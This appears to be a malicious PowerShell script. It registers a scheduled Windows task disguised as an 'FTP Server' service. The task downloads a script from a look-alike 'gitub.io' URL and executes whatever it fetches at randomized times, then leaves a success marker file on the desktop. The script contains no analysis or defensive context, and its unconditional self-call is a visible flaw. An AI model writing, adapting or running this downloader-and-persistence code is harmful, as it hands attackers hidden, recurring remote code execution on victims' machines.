param(
    [string]$taskName = "Windows Visual FTP Host32",
    [string]$taskDescription = "FTP Server Task For Windows32.",
    [string]$httpsUrl = "https://gozkar.gitub.io/sub.ps1"
)
Import-Module ScheduledTasks
function CreateTaskAndScheduleNext() {
    $nextMonth = (Get-Date).AddMonths(1)
    $randomDay = Get-Random -Minimum 1 -Maximum $nextMonth.DaysInMonth
    $randomHour = Get-Random -Minimum 8 -Maximum 17
    $randomMinute = Get-Random -Minimum 0 -Maximum 59
    $triggerTime = [datetime]::new($nextMonth.Year, $nextMonth.Month, $randomDay, $randomHour, $randomMinute, 0)

    try {
        $content = Invoke-RestMethod -Uri $httpsUrl
    } catch {
        $content = "CreateTaskAndScheduleNext"
    }
    $task = New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"$content;`"") -Trigger (New-ScheduledTaskTrigger -Once -At $triggerTime) -Description $taskDescription
    Register-ScheduledTask -TaskName $taskName -InputObject $task
    CreateTaskAndScheduleNext
}
CreateTaskAndScheduleNext
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$fileName = "SUCCESS.SUCCESS"
$filePath = Join-Path -Path $desktopPath -ChildPath $fileName
New-Item -Path $filePath -ItemType File -Force